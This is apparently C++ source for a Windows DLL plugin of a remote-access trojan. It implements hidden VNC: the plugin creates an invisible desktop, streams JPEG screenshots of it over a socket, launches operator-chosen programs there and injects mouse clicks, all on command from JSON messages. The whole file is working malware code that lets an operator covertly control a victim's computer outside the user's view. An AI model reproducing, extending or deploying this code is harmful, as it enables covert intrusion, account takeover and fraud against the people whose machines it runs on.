#include <winsock2.h>
#include <windows.h>
#include <objbase.h>
#include <gdiplus.h>
#include <atomic>
#include <cstdint>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HIDDEN_VNC_FRAME = 0x06;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;

static atomic_bool g_hvncRunning(false);
static thread g_hvncThread;
static mutex g_sendMutex;
static HDESK g_hHiddenDesktop = NULL;
static string g_desktopName = "HVNC_Desktop";

static ULONG_PTR g_gdiplusToken = 0;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<BYTE> buffer(size);
    ImageCodecInfo* codecs = (ImageCodecInfo*)buffer.data();
    GetImageEncoders(count, size, codecs);
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return i;
        }
    }
    return -1;
}

static bool capture_desktop(HDC hdc, int scalePercent, vector<unsigned char>& jpegBytes, int& width, int& height) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    width = (screenWidth * scalePercent) / 100;
    height = (screenHeight * scalePercent) / 100;

    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
    HGDIOBJ oldBitmap = SelectObject(memDC, hBitmap);

    SetStretchBltMode(memDC, HALFTONE);
    StretchBlt(memDC, 0, 0, width, height, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

    CLSID clsid;
    get_encoder_clsid(L"image/jpeg", &clsid);
    Bitmap bmp(hBitmap, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK && stream) {
        ULONG quality = 50;
        EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid = EncoderQuality;
        params.Parameter[0].Type = EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        params.Parameter[0].Value = &quality;

        bmp.Save(stream, &clsid, &params);

        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        jpegBytes.resize((size_t)stat.cbSize.QuadPart);
        LARGE_INTEGER li = {0};
        stream->Seek(li, STREAM_SEEK_SET, NULL);
        ULONG read;
        stream->Read(jpegBytes.data(), (ULONG)jpegBytes.size(), &read);
        stream->Release();
    }

    SelectObject(memDC, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    return !jpegBytes.empty();
}

static void hvnc_loop(SOCKET sock, int scalePercent) {
    SetThreadDesktop(g_hHiddenDesktop);
    HDC hdc = GetDC(NULL);

    while (g_hvncRunning) {
        vector<unsigned char> jpegBytes;
        int w, h;
        if (capture_desktop(hdc, scalePercent, jpegBytes, w, h)) {
            MonitorFrameHeader fh = {0, (uint32_t)scalePercent, 10, (uint32_t)w, (uint32_t)h, MONITOR_FRAME_FORMAT_JPEG, (uint32_t)jpegBytes.size()};
            PacketHeader ph = {PACKET_SIGNATURE, PACKET_TYPE_HIDDEN_VNC_FRAME, (uint32_t)(sizeof(fh) + jpegBytes.size())};

            string packet;
            packet.resize(sizeof(ph) + sizeof(fh) + jpegBytes.size());
            memcpy(&packet[0], &ph, sizeof(ph));
            memcpy(&packet[sizeof(ph)], &fh, sizeof(fh));
            memcpy(&packet[sizeof(ph) + sizeof(fh)], jpegBytes.data(), jpegBytes.size());

            lock_guard<mutex> lock(g_sendMutex);
            if (!safe_send_raw(sock, packet)) break;
        }
        Sleep(100);
    }
    ReleaseDC(NULL, hdc);
}

static void inject_mouse_event(const string& eventType, int button, int x_norm, int y_norm) {
    HDESK hOld = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(g_hHiddenDesktop);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int x = (x_norm * screenWidth) / 65535;
    int y = (y_norm * screenHeight) / 65535;

    HWND hwnd = WindowFromPoint({x, y});
    if (hwnd) {
        POINT pt = {x, y};
        ScreenToClient(hwnd, &pt);
        LPARAM lParam = MAKELPARAM(pt.x, pt.y);
        UINT msg = 0;

        if (eventType == "move") msg = WM_MOUSEMOVE;
        else if (eventType == "down") {
            if (button == 0) msg = WM_LBUTTONDOWN;
            else if (button == 1) msg = WM_RBUTTONDOWN;
            else if (button == 2) msg = WM_MBUTTONDOWN;
        } else if (eventType == "up") {
            if (button == 0) msg = WM_LBUTTONUP;
            else if (button == 1) msg = WM_RBUTTONUP;
            else if (button == 2) msg = WM_MBUTTONUP;
        }

        if (msg) PostMessageA(hwnd, msg, (msg == WM_MOUSEMOVE ? 0 : MK_LBUTTON), lParam);
    }

    SetThreadDesktop(hOld);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);

    g_hHiddenDesktop = CreateDesktopA(g_desktopName.c_str(), NULL, NULL, 0, DESKTOP_CREATEWINDOW | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_ENUMERATE | DESKTOP_JOURNALPLAYBACK, NULL);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json cmd = json::parse(commandJson);
        string action = cmd.value("action", "");

        if (action == "hvnc_start") {
            int scale = cmd.value("quality", 50);
            if (!g_hvncRunning) {
                g_hvncRunning = true;
                g_hvncThread = thread(hvnc_loop, sock, scale);
            }
        } else if (action == "hvnc_stop") {
            g_hvncRunning = false;
            if (g_hvncThread.joinable()) g_hvncThread.join();
        } else if (action == "hvnc_run") {
            string path = cmd.value("path", "");
            STARTUPINFOA si = {sizeof(si)};
            si.lpDesktop = (char*)g_desktopName.c_str();
            PROCESS_INFORMATION pi;
            if (CreateProcessA(NULL, (char*)path.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        } else if (action == "hvnc_mouse") {
            string ev = cmd.value("event", "");
            int btn = cmd.value("button", 0);
            int x = cmd.value("x", 0);
            int y = cmd.value("y", 0);
            inject_mouse_event(ev, btn, x, y);
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_hvncRunning = false;
        if (g_hvncThread.joinable()) g_hvncThread.join();
        if (g_hHiddenDesktop) CloseDesktop(g_hHiddenDesktop);
    }
    return TRUE;
}
